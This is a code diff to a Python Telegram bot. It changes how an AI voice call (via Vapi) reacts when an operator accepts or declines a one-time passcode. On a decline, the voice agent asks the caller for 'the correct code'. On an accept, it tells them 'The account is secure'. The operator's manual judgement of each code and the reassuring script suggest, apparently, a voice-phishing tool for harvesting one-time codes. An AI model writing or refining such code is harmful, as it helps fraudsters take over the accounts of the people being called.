@@ -5308,11 +5308,14 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
 
         vapi_id = session.get("vapi_call_id") if session else None
         if vapi_id:
-            from services.vapi_service import end_call as vapi_end_call
+            from services.vapi_service import say_to_assistant, end_call as vapi_end_call
+            import time
             try:
+                say_to_assistant(vapi_id, "Your identity is verified. The account is secure. Goodbye.")
+                time.sleep(2)
                 vapi_end_call(vapi_id)
             except Exception as e:
-                logger.debug(f"Vapi end_call on accept: {e}")
+                logger.debug(f"Vapi say/end on accept: {e}")
         return
 
     if call.data.startswith("otp_decline_"):
@@ -5331,13 +5334,19 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
 
         vapi_id = session.get("vapi_call_id") if session else None
         if vapi_id:
-            from services.vapi_service import end_call as vapi_end_call
+            from services.vapi_service import say_to_assistant, end_call as vapi_end_call
+            import time
             try:
-                vapi_end_call(vapi_id)
+                if attempts >= 3:
+                    say_to_assistant(vapi_id, "I can't verify the code. Please contact support. Goodbye.")
+                    time.sleep(2)
+                    vapi_end_call(vapi_id)
+                else:
+                    say_to_assistant(vapi_id, "That code didn't match. Please check and give me the correct code.")
             except Exception as e:
-                logger.debug(f"Vapi end_call on decline: {e}")
+                logger.debug(f"Vapi say on decline: {e}")
 
-        bot.send_message(chat_id, f"❌ Code DECLINED{' — final attempt reached' if attempts >= 3 else ''}")
+        bot.send_message(chat_id, f"❌ Code DECLINED{' — final attempt reached, call ended' if attempts >= 3 else ' — AI will ask again'}")
         return
 
     # --- Fallback ---
